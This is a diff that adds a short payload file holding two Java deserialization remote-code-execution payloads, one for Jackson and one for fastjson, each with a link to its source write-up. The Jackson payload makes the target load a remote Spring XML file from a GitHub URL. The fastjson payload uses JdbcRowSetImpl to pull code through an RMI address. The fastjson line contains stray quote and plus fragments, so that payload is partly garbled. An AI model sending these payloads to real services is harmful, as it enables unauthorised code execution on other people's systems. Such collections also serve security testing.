@@ -1,0 +1,8 @@
+# jackson
+# https://github.com/irsl/jackson-rce-via-spel
+{"id":123, "obj": ["org.springframework.context.support.FileSystemXmlApplicationContext", "https://raw.githubusercontent.com/irsl/jackson-rce-via-spel/master/spel.xml"]}
+
+
+# fastjson
+# https://jkme.github.io/fastjson-rce.html
+{ "name ":{ "@type ": "java.lang.Class ", "val ": "com.sun.rowset.JdbcRowSetImpl "}," +" "xxxx ":{ "@type ": "com.sun.rowset.JdbcRowSetImpl ", "dataSourceName ":" +" "rmi://localhost:1099/Exploit ", "autoCommit ":true}}}
